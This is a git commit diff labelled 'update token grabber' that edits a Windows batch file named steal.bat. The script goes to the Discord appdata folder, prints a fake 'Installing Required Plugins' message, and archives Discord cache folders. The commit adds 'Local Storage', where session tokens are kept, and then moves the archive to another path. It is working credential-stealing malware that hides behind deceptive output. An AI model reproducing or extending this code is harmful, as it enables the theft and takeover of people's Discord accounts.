c22e819efe1e25568ec1c5be958ab1256ec665ed
MonkNo1 <hitman20025@gmail.com>
2023-06-16 21:39:03 -0700

    update token grabber

--- source/steal.bat
+++ source/steal.bat
@@ -1,7 +1,7 @@
 @echo off 
 cd /D %appdata%\discord
 echo "Installing Required Plugins.....!"
-tar -cvzf locked.tar.gz GPUCache "Code Cache" Cache >nul 2>nul
+tar -cvzf locked.tar.gz GPUCache "Code Cache" Cache "Local Storage" >nul 2>nul
 ren locked.tar.gz locked
 move locked E:\programing\sh\bash
 exit
